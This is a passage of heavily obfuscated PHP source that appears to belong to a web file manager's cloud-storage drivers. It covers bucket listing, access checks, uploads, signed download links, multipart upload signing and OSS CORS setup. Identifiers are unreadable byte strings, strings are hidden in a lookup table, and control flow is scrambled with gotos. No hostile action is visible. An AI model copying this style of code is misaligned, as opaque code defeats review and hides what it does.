ÇÊ„; f—ŸÓ ÇÊ„: $A‹Ä®Ù‘ª¤ = trim($A‹Ä®Ù‘ª¤, $fæöª®íõ¢[8]) . $fæöª®íõ¢[8]; $eÜ°†îŒğ = $this->objectMeta($A‹Ä®Ù‘ª¤); if (isset($eÜ°†îŒğ[$fæöª®íõ¢[195]])) { $AŠö¿‰ê²ò[$fæöª®íõ¢[192]] = $eÜ°†îŒğ[$fæöª®íõ¢[195]]; } goto f’óË‡°á; E›•ÈÆ³õ: } private function fileList($dÀêìêîñ, $Bï´ì±áÖ = '', $F„‘—÷Ç”° = 0) { goto cã¾…¿­Èò; BŒ¹ƒ£µ¹»: foreach ($A­‡èÀ‡Æ‰[$FÎ¦ÀÊ°¦é[196]] as $aÔ¼ò¿ĞÔÚ) { goto a’Šéğˆ«Â; a’Šéğˆ«Â: $Dˆ‡Âƒ‚¹¿ = $aÔ¼ò¿ĞÔÚ[$FÎ¦ÀÊ°¦é[28]]; if ($Dˆ‡Âƒ‚¹¿ == $a«î’Â¦‹) { continue; } $B›µ¨µß›É = isset($aÔ¼ò¿ĞÔÚ[$FÎ¦ÀÊ°¦é[77]]) ? $aÔ¼ò¿ĞÔÚ[$FÎ¦ÀÊ°¦é[77]] : 0; goto f±ÊÄšÙŒ; B‚äƒÇÍ¾: $CâÙ£Ü¡†è[] = $F„‘—÷Ç”° ? $aÔ¼ò¿ĞÔÚ : $Dˆ‡Âƒ‚¹¿; goto EÎ°“¡¸˜®; f±ÊÄšÙŒ: $Bƒ›‡ö§ò = $B›µ¨µß›É == 0 && substr($Dˆ‡Âƒ‚¹¿, strlen($Dˆ‡Âƒ‚¹¿) - 1, 1) == $FÎ¦ÀÊ°¦é[8] ? !0 : !1; if ($BÅ›ŠØÃÍ) { $this->cacheMethod($FÎ¦ÀÊ°¦é[197], $Dˆ‡Âƒ‚¹¿, $Bƒ›‡ö§ò); $this->cacheMethod($FÎ¦ÀÊ°¦é[198], $Dˆ‡Âƒ‚¹¿, $aÔ¼ò¿ĞÔÚ); } if ($Bƒ›‡ö§ò) { $c­¾ÌÉÆÙó[] = $Dˆ‡Âƒ‚¹¿; continue; } goto B‚äƒÇÍ¾; EÎ°“¡¸˜®: } foreach ($A­‡èÀ‡Æ‰[$FÎ¦ÀÊ°¦é[199]] as $aÔ¼ò¿ĞÔÚ) { $c­¾ÌÉÆÙó[] = $aÔ¼ò¿ĞÔÚ[$FÎ¦ÀÊ°¦é[28]]; if ($BÅ›ŠØÃÍ) { $this->cacheMethod($FÎ¦ÀÊ°¦é[197], $aÔ¼ò¿ĞÔÚ[$FÎ¦ÀÊ°¦é[28]], !0); } } if ($BÅ›ŠØÃÍ) { $this->cacheMethod($FÎ¦ÀÊ°¦é[197], $dÀêìêîñ, !0); } goto B’Ûš¸‡º¶; B’Ûš¸‡º¶: return array($FÎ¦ÀÊ°¦é[74] => $c­¾ÌÉÆÙó, $FÎ¦ÀÊ°¦é[73] => $CâÙ£Ü¡†è); goto D…­š–öè¨; D»²ŸµíÈß: if (!$A­‡èÀ‡Æ‰) { return array($FÎ¦ÀÊ°¦é[74] => array(), $FÎ¦ÀÊ°¦é[73] => array()); } $BÅ›ŠØÃÍ = $this->listItemCache === !1 ? !1 : !0; $c­¾ÌÉÆÙó = $CâÙ£Ü¡†è = array(); goto BŒ¹ƒ£µ¹»; cã¾…¿­Èò: $FÎ¦ÀÊ°¦é =& $_SERVER[Æ¼ôºÙï]; $a«î’Â¦‹ = rtrim($dÀêìêîñ, $FÎ¦ÀÊ°¦é[8]) . $FÎ¦ÀÊ°¦é[8]; $A­‡èÀ‡Æ‰ = $this->listObjs($a«î’Â¦‹, null, null, $Bï´ì±áÖ); goto D»²ŸµíÈß; D…­š–öè¨: } private function listObjs($fôğ¸ŠÁî, $BÅ……Òô³ = null, $f‘‹Ü¸„Å = null, $AÙÄÙïŞƒ = null) { $Aó¯òÁéËå =& $_SERVER[Æ¼ôºÙï]; $fôğ¸ŠÁî = trim($fôğ¸ŠÁî, $Aó¯òÁéËå[8]); $Dæ©ò¹·š‡ = empty($fôğ¸ŠÁî) ? $Aó¯òÁéËå[33] : $fôğ¸ŠÁî . $Aó¯òÁéËå[8]; return $this->client->getBucket($this->bucket, $Dæ©ò¹·š‡, $BÅ……Òô³, $f‘‹Ü¸„Å, $AÙÄÙïŞƒ, !0); } public function has($B”²Ş„¨£â, $e®‚¼ó³¤ = false, $AƒÈİŒÊ­÷ = true) { goto F¢À‰Ë; F„È‚¨ÛÆ: return !1; goto A½÷×­¿½ô; Aœ¯Ø³‡: $d‘÷‡ “Œ± = $C¬·ò‰‘Âà = array(); while (!0) { $B®¾ò¢ÇËˆ = $this->listObjs($B”²Ş„¨£â, $c’éÁ°ç“•, $e÷Ù‚à÷“ó, $A÷ä¨Úˆì‡); if (!$B®¾ò¢ÇËˆ) { break; } $c’éÁ°ç“• = $B®¾ò¢ÇËˆ[$bÖ—ºÒ‰¥[200]]; $d¦Â¦‡¾àÅ = $B®¾ò¢ÇËˆ[$bÖ—ºÒ‰¥[196]]; $BƒºÍñå = $B®¾ò¢ÇËˆ[$bÖ—ºÒ‰¥[199]]; if (empty($d¦Â¦‡¾àÅ) && empty($BƒºÍñå)) { break; } if (count($d¦Â¦‡¾àÅ) == 1 && $d¦Â¦‡¾àÅ[0][$bÖ—ºÒ‰¥[28]] == $aä«‹š¤ƒ©) { break; } if ($e®‚¼ó³¤) { if (count($d¦Â¦‡¾àÅ)) { $d¦Â¦‡¾àÅ = array_column($d¦Â¦‡¾àÅ, $bÖ—ºÒ‰¥[28]); $d‘÷‡ “Œ± = array_merge($d‘÷‡ “Œ±, $d¦Â¦‡¾àÅ); } if (count($BƒºÍñå)) { $BƒºÍñå = array_column($BƒºÍñå, $bÖ—ºÒ‰¥[28]); $C¬·ò‰‘Âà = array_merge($C¬·ò‰‘Âà, $BƒºÍñå); } if ($c’éÁ°ç“• === null) { break; } continue; } if ($AƒÈİŒÊ­÷) { if (!empty($d¦Â¦‡¾àÅ)) { if (count($d¦Â¦‡¾àÅ) > 1 || isset($d¦Â¦‡¾àÅ[0][$bÖ—ºÒ‰¥[28]]) && $d¦Â¦‡¾àÅ[0][$bÖ—ºÒ‰¥[28]] != $aä«‹š¤ƒ©) { return !0; } } } else { if (!empty($BƒºÍñå)) { return !0; } } if ($c’éÁ°ç“• === null) { break; } } if ($e®‚¼ó³¤) { $d‘÷‡ “Œ± = array_diff($d‘÷‡ “Œ±, array($aä«‹š¤ƒ©)); $d‘÷‡ “Œ± = count(array_unique($d‘÷‡ “Œ±)); $C¬·ò‰‘Âà = count(array_unique($C¬·ò‰‘Âà)); return array($bÖ—ºÒ‰¥[201] => $d‘÷‡ “Œ±, $bÖ—ºÒ‰¥[202] => $C¬·ò‰‘Âà); } goto F„È‚¨ÛÆ; eÆòóùÆ¾¯: $c’éÁ°ç“• = null; $e÷Ù‚à÷“ó = 500; $A÷ä¨Úˆì‡ = $bÖ—ºÒ‰¥[8]; goto Aœ¯Ø³‡; F¢À‰Ë: $bÖ—ºÒ‰¥ =& $_SERVER[Æ¼ôºÙï]; $B”²Ş„¨£â = trim($B”²Ş„¨£â, $bÖ—ºÒ‰¥[8]); $aä«‹š¤ƒ© = empty($B”²Ş„¨£â) ? $bÖ—ºÒ‰¥[33] : $B”²Ş„¨£â . $bÖ—ºÒ‰¥[8]; goto eÆòóùÆ¾¯; A½÷×­¿½ô: } public function listAll($C¼¨¿Ÿ¬“) { $EÚ¸µ÷› =& $_SERVER[Æ¼ôºÙï]; $f¢‡†Ÿ«¶ = $this->fileList($C¼¨¿Ÿ¬“, $EÚ¸µ÷›[33], !0); $b‘ŠåÜï„ = array(); foreach ($f¢‡†Ÿ«¶[$EÚ¸µ÷›[73]] as $b›“ó…Ò§´) { $b‘ŠåÜï„[$b›“ó…Ò§´[$EÚ¸µ÷›[28]]] = $b›“ó…Ò§´[$EÚ¸µ÷›[77]]; } foreach ($f¢‡†Ÿ«¶[$EÚ¸µ÷›[74]] as $b›“ó…Ò§´) { if (is_string($b›“ó…Ò§´)) { $b‘ŠåÜï„[$b›“ó…Ò§´] = 0; } } return $this->listAllFiles($C¼¨¿Ÿ¬“, array_keys($b‘ŠåÜï„), $b‘ŠåÜï„); } public function canRead($Bî‹÷…•á) { $B†ÑØÔ“ƒº =& $_SERVER[Æ¼ôºÙï]; $Cò½œå´Û» = $this->client->getAccessControlPolicy($this->bucket, $Bî‹÷…•á); if (!$Cò½œå´Û») { return !1; } return in_array($Cò½œå´Û», array($B†ÑØÔ“ƒº[203], $B†ÑØÔ“ƒº[204], $B†ÑØÔ“ƒº[205])) ? !0 : !1; } public function canWrite($f²‰‘ÙîÂ”) { $c…¨ôƒ¿ñ“ =& $_SERVER[Æ¼ôºÙï]; $Côğ«îìÇÌ = $this->client->getAccessControlPolicy($this->bucket, $f²‰‘ÙîÂ”); if (!$Côğ«îìÇÌ) { return !1; } return in_array($Côğ«îìÇÌ, array($c…¨ôƒ¿ñ“[203], $c…¨ôƒ¿ñ“[204])) ? !0 : !1; } public function getContent($c®³†Ò¹Ò) { return $this->client->getObject($this->bucket, $c®³†Ò¹Ò); } public function setContent($cÔ†­Õé‡¨, $B®¿åÏë¸ = '', $AÂ‘«”ÆŠ— = false) { goto e‰©¢ê”ˆ‚; e‰©¢ê”ˆ‚: $A¶Ö·æ„àƒ =& $_SERVER[Æ¼ôºÙï]; $cÔ†­Õé‡¨ = $AÂ‘«”ÆŠ— ? trim($cÔ†­Õé‡¨, $A¶Ö·æ„àƒ[8]) . $A¶Ö·æ„àƒ[8] : $cÔ†­Õé‡¨; $D‡ñëÑ»ù = get_file_mime(get_path_ext($cÔ†­Õé‡¨)); goto eëÓ®»ÊñŸ; eëÓ®»ÊñŸ: $fì†‘Ä¼‘È = $this->client->putObject($B®¿åÏë¸, $this->bucket, $cÔ†­Õé‡¨, $A¶Ö·æ„àƒ[191], array(), $D‡ñëÑ»ù); if (!$fì†‘Ä¼‘È) { return !1; } if ($AÂ‘«”ÆŠ—) { return !0; } goto cëÒ²ËíŠ³; cëÒ²ËíŠ³: $this->cacheMethod(null, null); $fì†‘Ä¼‘È = $this->copyFile($cÔ†­Õé‡¨, $cÔ†­Õé‡¨, array($A¶Ö·æ„àƒ[206] => $fì†‘Ä¼‘È[$A¶Ö·æ„àƒ[207]])); return $fì†‘Ä¼‘È ? !0 : !1; goto F‚«æŸ¿×”; F‚«æŸ¿×”: } public function fileSubstr($dö°ÊÌöº, $A«¬É¹İ†Ò, $c¸†ï™¯) { $dÖ·ƒ“¿Ó” = $A«¬É¹İ†Ò + $c¸†ï™¯ - 1; return $this->client->getObject($this->bucket, $dö°ÊÌöº, array($_SERVER[Æ¼ôºÙï][208] => "\142\171\x74\145\163\x3d{$A«¬É¹İ†Ò}\x2d{$dÖ·ƒ“¿Ó”}")); } public function upload($cˆ×“è÷˜ƒ, $cµ»‚¢¡±, $d‘Å–±É = false, $A—å“ôÓë = REPEAT_REPLACE) { $eÈå…ñ÷Â§ =& $_SERVER[Æ¼ôºÙï]; $aÑô­”ƒ±ø = array($eÈå…ñ÷Â§[206] => @md5_file($cµ»‚¢¡±)); $eèå¸ šÀ¥ = array($eÈå…ñ÷Â§[209] => get_file_mime(get_path_ext($cˆ×“è÷˜ƒ))); if (IO::size($cµ»‚¢¡±) <= 1024 * 1024 * 200) { $Cğèç™Ì´ = $this->client->putObjectFile($cµ»‚¢¡±, $this->bucket, $cˆ×“è÷˜ƒ, $eÈå…ñ÷Â§[191], $aÑô­”ƒ±ø, $eèå¸ šÀ¥); return !empty($Cğèç™Ì´) ? $this->getPathOuter($cˆ×“è÷˜ƒ) : !1; } $a÷ˆ¡ÛíÃ… = $this->client->multiUploadObject($cµ»‚¢¡±, $this->bucket, trim($cˆ×“è÷˜ƒ, $eÈå…ñ÷Â§[8]), $aÑô­”ƒ±ø, $eèå¸ šÀ¥); return $a÷ˆ¡ÛíÃ… ? $this->getPathOuter($cˆ×“è÷˜ƒ) : !1; } public function download($eĞ¯›˜ãòè, $e¥øµï‰Ò) { if (!@is_dir($this->pathFather($e¥øµï‰Ò)) && !IO::mkdir($this->pathFather($e¥øµï‰Ò))) { return !1; } $e±Öñ˜ì† = $this->client->getObject($this->bucket, $eĞ¯›˜ãòè, array(), $e¥øµï‰Ò); return $e±Öñ˜ì† !== !1 ? $e¥øµï‰Ò : !1; } public function link($dè¹Ò‰ªœ, $Eçª†Ğ„ÕĞ = array()) { $D£à¥ãÊóÔ =& $_SERVER[Æ¼ôºÙï]; if ($this->signVer == $D£à¥ãÊóÔ[210]) { return $this->client->getAuthenticatedURL($this->bucket, $dè¹Ò‰ªœ, 3600 * 12, $Eçª†Ğ„ÕĞ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($dè¹Ò‰ªœ, $D£à¥ãÊóÔ[8]), 3600 * 12, $this->region, array(), !0, $Eçª†Ğ„ÕĞ); } public function fileOut($bÄ‘Ò¨ÉßÊ, $b•Æ™‰‰Â¶ = false, $bİØ¯•Ê² = false, $D¥ºâª‚©Ş = '') { goto eˆÃ†¯¶‰—; C¾çƒÕÃ: $DãËõŒÚñŸ = array($FÙù¸ÑˆñÚ[214] => $b•Æ™‰‰Â¶ . $FÙù¸ÑˆñÚ[215] . rawurlencode($bİØ¯•Ê²), $FÙù¸ÑˆñÚ[216] => $C¾¾¼ß—é’); $bÃœÆ–Úß— = $this->link($bÄ‘Ò¨ÉßÊ, $DãËõŒÚñŸ); $this->fileOutLink($bÃœÆ–Úß—); goto EÎô†âè¨ ; eˆÃ†¯¶‰—: $FÙù¸ÑˆñÚ =& $_SERVER[Æ¼ôºÙï]; if ($this->isFileOutServer()) { return $this->fileOutServer($bÄ‘Ò¨ÉßÊ, $b•Æ™‰‰Â¶, $bİØ¯•Ê², $D¥ºâª‚©Ş); } if (!$bİØ¯•Ê²) { $bİØ¯•Ê² = $this->pathThis($bÄ‘Ò¨ÉßÊ); } goto FëŞåø™Ë; FëŞåø™Ë: $C¾¾¼ß—é’ = get_file_mime(get_path_ext($bİØ¯•Ê²)); if ($C¾¾¼ß—é’ == $FÙù¸ÑˆñÚ[211]) { return parent::fileOut($bÄ‘Ò¨ÉßÊ, $b•Æ™‰‰Â¶, $bİØ¯•Ê², $D¥ºâª‚©Ş); } $b•Æ™‰‰Â¶ = $b•Æ™‰‰Â¶ ? $FÙù¸ÑˆñÚ[212] : $FÙù¸ÑˆñÚ[213]; goto C¾çƒÕÃ; EÎô†âè¨ : } public function fileOutServer($DÜæ’Åñõ“, $B°„ğÊÔŸ® = false, $B³ğ²ÅÏˆí = false, $Fµã—Š£êÛ = '') { parent::fileOut($DÜæ’Åñõ“, $B°„ğÊÔŸ®, $B³ğ²ÅÏˆí, $Fµã—Š£êÛ); } public function fileOutImageServer($C±ñØ°¼«†, $CÆßÌ‡íù² = 250) { parent::fileOutImage($C±ñØ°¼«†, $CÆßÌ‡íù²); } public function hashMd5($BœÏíã­©, $E«¬±‡Š… = '') { $E©Õ¹»²Ÿ‹ =& $_SERVER[Æ¼ôºÙï]; $C¤ÍĞä®µ‰ = $this->objectMeta($BœÏíã­©); if (!$C¤ÍĞä®µ‰) { return !1; } $E«¬±‡Š… = $E«¬±‡Š… ? $E«¬±‡Š… : _get($C¤ÍĞä®µ‰, $E©Õ¹»²Ÿ‹[217]); $E«¬±‡Š… = $E«¬±‡Š… ? $E«¬±‡Š… : _get($C¤ÍĞä®µ‰, $E©Õ¹»²Ÿ‹[207], $E©Õ¹»²Ÿ‹[33]); return $E«¬±‡Š…; } public function uploadFormData($eÁ÷•Í˜±ˆ, $Eñàó»ä‹ = 3600) { $F¡‘Í¶¿¼ƒ =& $_SERVER[Æ¼ôºÙï]; $b«ÖÃèõÚà = $this->pathFather($eÁ÷•Í˜±ˆ); $EŸ¤ö¥íŞ = $this->client->getHttpUploadPostParams($this->bucket, $b«ÖÃèõÚà, $F¡‘Í¶¿¼ƒ[191], $Eñàó»ä‹); return array_merge((array) $EŸ¤ö¥íŞ, array($F¡‘Í¶¿¼ƒ[175] => $this->getHost())); } public function multiUploadFormData($Bç·ÇÄøˆ, $Eæ¢±ï©íÃ = 3600) { $cˆôáŒšƒ† =& $_SERVER[Æ¼ôºÙï]; $dßÑô¢º½º = gmdate($cˆôáŒšƒ†[218]); $fªË¤Ä×ó´ = array(); $eœéÚ†ËÓ = $this->client->getUploadId($this->bucket, $Bç·ÇÄøˆ, $fªË¤Ä×ó´); if (!$eœéÚ†ËÓ) { return !1; } return array($cˆôáŒšƒ†[219] => $eœéÚ†ËÓ, $cˆôáŒšƒ†[175] => $this->getHost() . $cˆôáŒšƒ†[8] . $this->pathEncode($Bç·ÇÄøˆ), $cˆôáŒšƒ†[220] => $dßÑô¢º½º, $cˆôáŒšƒ†[92] => $Bç·ÇÄøˆ); } public function multiUploadAuthData($AË¬ ¬²ù, $e”ñï°ã› = array()) { goto AáêÉÚ¢øî; Eï‡Ë«ÌÎÌ: $f¡¾»ëäÙ = implode($a˜“‡Â§Ö[227], $AÏå‰¶³Ü); $f¤öÍâÔœñ = base64_encode(hash_hmac($a˜“‡Â§Ö[228], $f¡¾»ëäÙ, $this->secret, !0)); $aœ¼õƒ² = $a˜“‡Â§Ö[229] . $this->accessKey . $a˜“‡Â§Ö[4] . $f¤öÍâÔœñ; goto e£Î×É­‘å; AáêÉÚ¢øî: $a˜“‡Â§Ö =& $_SERVER[Æ¼ôºÙï]; $dôò¸İÓ¹ = isset($e”ñï°ã›[$a˜“‡Â§Ö[220]]) ? $e”ñï°ã›[$a˜“‡Â§Ö[220]] : gmdate($a˜“‡Â§Ö[218]); $AŠàÕÎ²’Ñ = isset($e”ñï°ã›[$a˜“‡Â§Ö[167]]) ? $e”ñï°ã›[$a˜“‡Â§Ö[167]] : $a˜“‡Â§Ö[33]; goto e»Ê»†¼Éˆ; AÇÜæƒ¸õ²: $AÏå‰¶³Ü = array($a˜“‡Â§Ö[222], $a˜“‡Â§Ö[33], $a˜“‡Â§Ö[118], $a˜“‡Â§Ö[33], "\170\55\141\x6d\x7a\55\x64\141\164\145\x3a{$dôò¸İÓ¹}", $a˜“‡Â§Ö[8] . $this->bucket . $a˜“‡Â§Ö[8] . $this->pathEncode($A„ÊˆÎİ‘) . $AŠàÕÎ²’Ñ); if (strpos($AŠàÕÎ²’Ñ, $a˜“‡Â§Ö[223]) === 0) { $AÏå‰¶³Ü[0] = $a˜“‡Â§Ö[224]; } if (isset($e”ñï°ã›[$a˜“‡Â§Ö[225]]) && $e”ñï°ã›[$a˜“‡Â§Ö[225]] == $a˜“‡Â§Ö[226]) { $AÏå‰¶³Ü[0] = $a˜“‡Â§Ö[226]; } goto Eï‡Ë«ÌÎÌ; e»Ê»†¼Éˆ: $A„ÊˆÎİ‘ = $e”ñï°ã›[$a˜“‡Â§Ö[92]]; unset($e”ñï°ã›[$a˜“‡Â§Ö[92]]); if (isset($e”ñï°ã›[$a˜“‡Â§Ö[221]])) { $e”ñï°ã›[$a˜“‡Â§Ö[220]] = $dôò¸İÓ¹; return $this->listUploadParts($A„ÊˆÎİ‘, $e”ñï°ã›); } goto AÇÜæƒ¸õ²; e£Î×É­‘å: if (strpos($AŠàÕÎ²’Ñ, $a˜“‡Â§Ö[223]) === 0) { return array($a˜“‡Â§Ö[230] => $aœ¼õƒ², $a˜“‡Â§Ö[220] => $dôò¸İÓ¹); } return $aœ¼õƒ²; goto B´¦»ë–¤Ï; B´¦»ë–¤Ï: } public function listUploadParts($Dİ…çŒÕ„Ô, $b·”Êç©·Ï = array()) { goto Fà²±÷©¤Û; a®¥ñ´Ó¾µ: if (!$bÚä¤ä¦”) { return !1; } unset($b·”Êç©·Ï[$aœ¹í»¶ç[221]], $b·”Êç©·Ï[$aœ¹í»¶ç[225]]); $b·”Êç©·Ï[$aœ¹í»¶ç[92]] = $Dİ…çŒÕ„Ô; goto DÜ•»º°ƒ; Fà²±÷©¤Û: $aœ¹í»¶ç =& $_SERVER[Æ¼ôºÙï]; $béêÕ¶’ç = str_replace($aœ¹í»¶ç[231], $aœ¹í»¶ç[33], $b·”Êç©·Ï[$aœ¹í»¶ç[167]]); $bÚä¤ä¦” = $this->client->listParts($this->bucket, $Dİ…çŒÕ„Ô, $béêÕ¶’ç); goto a®¥ñ´Ó¾µ; DÜ•»º°ƒ: $e¥±°°›Â© = $this->multiUploadAuthData($Dİ…çŒÕ„Ô, $b·”Êç©·Ï); if (empty($e¥±°°›Â©)) { return !1; } return array($aœ¹í»¶ç[230] => $e¥±°°›Â©, $aœ¹í»¶ç[220] => $b·”Êç©·Ï[$aœ¹í»¶ç[220]], $aœ¹í»¶ç[232] => $bÚä¤ä¦”); goto D§’À½áË‡; D§’À½áË‡: } public function getHost() { return parent::getHost() . $_SERVER[Æ¼ôºÙï][8] . $this->bucket; } public function size($cöœÃö£ç) { $CˆßèÔˆ‡Ó = $this->objectMeta($cöœÃö£ç); return $CˆßèÔˆ‡Ó ? $CˆßèÔˆ‡Ó[$_SERVER[Æ¼ôºÙï][77]] : 0; } public function info($CªèŒõğ¤) { if ($this->isFolder($CªèŒõğ¤)) { return $this->folderInfo($CªèŒõğ¤); } else { if ($this->isFile($CªèŒõğ¤)) { return $this->fileInfo($CªèŒõğ¤); } } return !1; } public function exist($Eâ‡Ø›®ñ) { return $this->isFile($Eâ‡Ø›®ñ) || $this->isFolder($Eâ‡Ø›®ñ); } public function isFile($c †ãñŒŒ) { return !$this->isFolder($c †ãñŒŒ) && $this->objectMeta($c †ãñŒŒ); } public function isFolder($bÎĞƒ÷×Ÿœ) { return $this->cacheMethod($_SERVER[Æ¼ôºÙï][197], $bÎĞƒ÷×Ÿœ); } protected function objectMeta($Aè ×Œó·) { return $this->cacheMethod($_SERVER[Æ¼ôºÙï][198], $Aè ×Œó·); } protected function _objectMeta($c¨Ø…Ï±Ñà) { $Aƒä”Ïğ‚¶ =& $_SERVER[Æ¼ôºÙï]; $c¨Ø…Ï±Ñà = rtrim($c¨Ø…Ï±Ñà, $Aƒä”Ïğ‚¶[8]); try { $C„’¦Ø†öÁ = $this->client->getObjectInfo($this->bucket, $c¨Ø…Ï±Ñà); if (!isset($C„’¦Ø†öÁ[$Aƒä”Ïğ‚¶[217]]) && isset($C„’¦Ø†öÁ[$Aƒä”Ïğ‚¶[233]])) { $C„’¦Ø†öÁ[$Aƒä”Ïğ‚¶[217]] = $C„’¦Ø†öÁ[$Aƒä”Ïğ‚¶[233]]; } } catch (Exception $e¿ªÆ‘£¬) { $C„’¦Ø†öÁ = !1; } if (!$C„’¦Ø†öÁ) { } return $C„’¦Ø†öÁ; } protected function _isFolder($aø»³œÆÔ) { goto bŠİ—±ÆÂ‹; FÕ¡œÅåõá: $Dõù§•Á– = $this->client->getBucket($this->bucket, $aø»³œÆÔ, null, 1); if (empty($Dõù§•Á–[$aÌ·¢Î[196]])) { return !1; } $AèêøË§® = $Dõù§•Á–[$aÌ·¢Î[196]][0][$aÌ·¢Î[28]]; goto BªãÛªšéß; bŠİ—±ÆÂ‹: $aÌ·¢Î =& $_SERVER[Æ¼ôºÙï]; $aø»³œÆÔ = rtrim($aø»³œÆÔ, $aÌ·¢Î[8]); if ($aø»³œÆÔ == $aÌ·¢Î[33] || $aø»³œÆÔ == $aÌ·¢Î[8]) { return !0; } goto FÕ¡œÅåõá; BªãÛªšéß: if (substr($AèêøË§®, -1) == $aÌ·¢Î[8]) { return !0; } if (get_path_this($AèêøË§®) == get_path_this($aø»³œÆÔ)) { return !1; } return !0; goto c¢ïéËŸƒ°; c¢ïéËŸƒ°: } } define($_SERVER[Æ¼ôºÙï][234], 1); goto A®‘©½‰ ¥; D×Ä¤ŒòĞ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($F§ì‰½Ã‚è) { parent::__construct(); include_once SDK_DIR . $_SERVER[Æ¼ôºÙï][1235]; $this->_init($F§ì‰½Ã‚è); } public function _init($DœÕˆùê–) { $DÔÚ²¡ƒØå =& $_SERVER[Æ¼ôºÙï]; foreach ($DœÕˆùê– as $AÜÜëšÓ› => $Dè¸ÃèÔ†¹) { if (isset($this->{$AÜÜëšÓ›})) { $this->{$AÜÜëšÓ›} = $Dè¸ÃèÔ†¹; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($DÔÚ²¡ƒØå[1236] . LNG($DÔÚ²¡ƒØå[1237])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto Fª­óÖÅ­Í; Fª­óÖÅ­Í: $CğåóÔÙÌ‰ =& $_SERVER[Æ¼ôºÙï]; $Aéóëëå…‚ = new OSS\Model\CorsConfig(); $E® ˆã»ğ = new OSS\Model\CorsRule(); goto DÜİÂæ; AÇ‚Áç»«: $Aéóëëå…‚->addRule($E® ˆã»ğ); try { $this->client->putBucketCors($this->bucket, $Aéóëëå…‚); } catch (OSS\Core\OssException $D˜Ûóç„¢¦) { return !1; } return !0; goto EÇ¯İõ¦Ë; eù§åÃğ«Œ: $E® ˆã»ğ->addAllowedMethod($CğåóÔÙÌ‰[1241]); $E® ˆã»ğ->addAllowedMethod($CğåóÔÙÌ‰[1242]); $E® ˆã»ğ->addAllowedMethod($CğåóÔÙÌ‰[157]); goto B‚†ÂÌÃ; B‚†ÂÌÃ: $E® ˆã»ğ->setMaxAgeSeconds(600); $E® ˆã»ğ->addExposeHeader($CğåóÔÙÌ‰[1243]); $E® ˆã»ğ->addAllowedHeader($CğåóÔÙÌ‰[1238]); goto AÇ‚Áç»«; DÜİÂæ: $E® ˆã»ğ->addAllowedOrigin($CğåóÔÙÌ‰[1238]); $E® ˆã»ğ->addAllowedMethod($CğåóÔÙÌ‰[1239]); $E® ˆã»ğ->addAllowedMethod($CğåóÔÙÌ‰[1240]); goto eù§åÃğ«Œ; EÇ¯İõ¦Ë: } public function getBucketCors() { goto fí¹œİêÇÑ; cøÓŒÌš±: if (!$B•êöã¨ÀÕ || !($a›òœÊ¹ì¢ = $B•êöã¨ÀÕ->getRules())) { return null; } $Bí„´ò’øé = $a›òœÊ¹ì¢[0]->getAllowedOrigins(); $FÃñ„œŒ½Ş = $a›òœÊ¹ì¢[0]->getAllowedMethods(); goto Cµìù‚Õ; Cµìù‚Õ: $aÔÊŸñ¤À• = $a›òœÊ¹ì¢[0]->getMaxAgeSeconds(); $AŒİóØêÛô = $a›òœÊ¹ì¢[0]->getExposeHeaders(); $B§½ŠàˆÀ = $a›òœÊ¹ì¢[0]->getAllowedHeaders(); goto E˜¡ø¯©Í‚; E˜¡ø¯©Í‚: return array($C†‹À½ê½ä[181] => isset($Bí„´ò’øé[0]) ? $Bí„´ò’øé[0] : $C†‹À½ê½ä[33], $C†‹À½ê½ä[185] => $FÃñ„œŒ½Ş, $C†‹À½ê½ä[1244] => $aÔÊŸñ¤À•, $C†‹À½ê½ä[1245] => isset($AŒİóØêÛô[0]) ? $AŒİóØêÛô[0] : $C†‹À½ê½ä[33], $C†‹À½ê½ä[183] => isset($B§½ŠàˆÀ[0]) ? $B§½ŠàˆÀ[0] : $C†‹À½ê½ä[33]); goto c¬‹Çˆˆ; fí¹œİêÇÑ: $C†‹À½ê½ä =& $_SERVER[Æ¼ôºÙï]; $B•êöã¨ÀÕ = null; try { $B•êöã¨ÀÕ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $A³¢Â¥ñì¸) { return null; } goto cøÓŒÌš±; c¬‹Çˆˆ: } public function isBucketCors() { goto aµÙŒ¹Á»ù; aµÙŒ¹Á»ù: $eˆòßÒ©¢ =& $_SERVER[Æ¼ôºÙï]; $f½¤¿ŒÅ¼­ = $this->getBucketCors(); if (!$f½¤¿ŒÅ¼­ || !is_array($f½¤¿ŒÅ¼­)) { return !1; } goto fÓØù™Å¬¤; a„“·½ªõ: $Dæ»µÄ²›ª = array($eˆòßÒ©¢[186], $eˆòßÒ©¢[187], $eˆòßÒ©¢[188], $eˆòßÒ©¢[189], $eˆòßÒ©¢[190]); $dÔµÒÕ = array_diff($Dæ»µÄ²›ª, $fö„‡“¼×…); return empty($dÔµÒÕ); goto aí•ª†µ¼‹; fÓØù™Å¬¤: if ($f½¤¿ŒÅ¼­[$eˆòßÒ©¢[181]] != $eˆòßÒ©¢[182] || $f½¤¿ŒÅ¼­[$eˆòßÒ©¢[183]] != $eˆòßÒ©¢[182]) { return !1; } $fö„‡“¼×… = array_map($eˆòßÒ©¢[184], $f½¤¿ŒÅ¼­[$eˆòßÒ©¢[185]]); if (!is_array($fö„‡“¼×…)) { $fö„‡“¼×… = array(); } goto a„“·½ªõ; aí•ª†µ¼‹: } public function mkfile($DÚ»î‡ÓĞÙ, $aÜ™º×ÃÅœ = '', $Fİ‚Œ…“ĞĞ = REPEAT_RENAME) { $E’µƒ¨ªŸŸ = $this->setContent($DÚ»î‡ÓĞÙ, $aÜ™º×ÃÅœ); if ($E’µƒ¨ªŸŸ !== !1) { return $this->getPathOuter($DÚ»î‡ÓĞÙ); } return !1; } public function mkdir($d‹„İ„äèá, $F´İåö×– = REPEAT_SKIP) { if ($this->_isFolder($d‹„İ„äèá)) { return $this->getPathOuter($d‹„İ„äèá); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($d‹„İ„äèá)); } catch (OSS\Core\OssException $F²ØğÓòèŠ) { return !1; } return $this->getPathOuter($d‹„İ„äèá); } private function fileList($a‘»©ËÍ“, $Bï˜† »¢§ = '', 